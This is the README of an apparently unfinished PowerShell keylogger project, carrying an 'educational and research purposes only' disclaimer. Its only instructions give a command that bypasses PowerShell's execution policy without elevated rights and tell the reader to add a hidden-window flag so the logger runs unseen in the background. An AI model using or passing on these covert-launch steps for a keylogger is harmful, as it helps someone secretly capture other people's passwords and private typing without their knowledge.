# Powershell_Keylogger - WIP
THIS TOOL IS FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY

MALICIOUS USE OF THIS TOOL MAY CONSTITUTE A CRIME

# Running Tool

Often times windows powershell prevents running scripts due to execution policy, this can be avoided by using the following syntax

```
powershell.exe -ExecutionPolicy Bypass -File keylogger.ps1
```
This command does not require elevated permissions

To run this as a job or in the background append the `-windowstyle hidden` argument to the previous command
